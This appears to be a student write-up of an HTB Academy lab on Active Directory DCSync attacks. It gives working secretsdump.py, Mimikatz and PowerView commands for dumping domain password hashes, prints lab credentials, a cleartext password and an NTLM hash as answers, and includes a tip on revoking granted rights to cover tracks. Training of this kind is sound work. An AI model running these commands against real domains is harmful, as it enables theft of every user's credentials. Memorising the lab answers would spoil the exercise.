### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: DCSync <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### DCSync

DCSync = abuse the Directory Replication Service Remote Protocol to mimic a DC and request password hashes for any domain user.

Required ACE: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`. Default for: Domain/Enterprise Admins, default domain administrator. Often delegated wider than that: find via BloodHound (`GetChanges` + `GetChangesAll` edges).

If you hold rights like `WriteDacl` on the domain object, you can grant yourself replication rights, run DCSync, then revoke to cover your tracks.

Tools: `Mimikatz lsadump::dcsync`, `Invoke-DCSync`, `secretsdump.py`.

<br>

---

<br>

### Verifying Replication Rights

```diff
+ PS> Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

<br>

Confirm via PowerView:

```diff
+ PS> $sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
+ PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ? {$_.SecurityIdentifier -match $sid} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

<br>

---

<br>

### Attack with secretsdump.py (Linux)

```diff
+ $ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

<br>

Useful flags:
- `-just-dc-ntlm`: NTLM hashes only
- `-just-dc-user <user>`: single user
- `-pwd-last-set`: pw change timestamps
- `-history`: pw history (for offline cracking + reuse stats)
- `-user-status`: flag disabled accounts

Output files: `<prefix>.ntds`, `<prefix>.ntds.kerberos`, `<prefix>.ntds.cleartext` (for accounts with reversible encryption).

Reversible encryption ≠ cleartext storage: RC4 encrypted with the SYSKEY. DA-equivalent extracts the key, secretsdump decrypts on the fly. Hunt for it:

```diff
+ PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+ PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

<br>

---

<br>

### Attack with Mimikatz (Windows)

Mimikatz must run as the user holding replication rights: use `runas /netonly`:

```diff
+ C:\> runas /netonly /user:INLANEFREIGHT\adunn powershell
```

<br>

In the new PowerShell, execute Mimikatz:

```diff
+ PS> .\mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

<br>

---

<br>

### DCSync Exercise

IPs: 10.129.66.231 (Win) + 10.129.244.132 (Linux)

RDP `htb-student:Academy_student_AD!`. SSH from Win → 172.16.5.225 with `htb-student:HTB_@cademy_stdnt!`.

---

### Question 1:
Perform a DCSync attack and look for another user with the option "Store password using reversible encryption" set. Submit the username as your answer.

#### RDP, import PowerView, filter user accounts by ENCRYPTED_TEXT_PWD_ALLOWED.

```diff
+ $ xfreerdp /v:10.129.66.231 /u:htb-student /p:'Academy_student_AD!' /dynamic-resolution
+ PS> cd c:\Tools
+ PS> Import-Module .\PowerView.ps1
+ PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

	syncron        ENCRYPTED_TEXT_PWD_ALLOWED, NORMAL_ACCOUNT

&#x1F6A9; found **syn--edit--**.

---

### Question 2:
What is this user's cleartext password?

#### runas as adunn (cracked from prior section), launch Mimikatz, lsadump: dcsync targeted at syncron: `Primary:CLEARTEXT` reveals the plaintext.

```diff
+ PS> runas /netonly /user:INLANEFREIGHT\adunn powershell
+ PS> cd C:\Tools\mimikatz\x64\
+ PS> .\mimikatz.exe
+ mimikatz # privilege::debug
+ mimikatz # lsadump::dcsync /domain:inlanefreight.local /user:inlanefreight\syncron
```

	* Primary:CLEARTEXT *
	    Mycleart3xtP@ss!

&#x1F6A9; found **Mycleart--edit--P@ss!**.

---

### Question 3:
Perform a DCSync attack and submit the NTLM hash for the khartsfield user as your answer.

```diff
+ mimikatz # lsadump::dcsync /domain:inlanefreight.local /user:inlanefreight\khartsfield
```

	Hash NTLM: 4bb3b317845f0954200a6b0acc9b9f9a

&#x1F6A9; found **4bb3b3178--edit--200a6b0acc9b9f9a**.
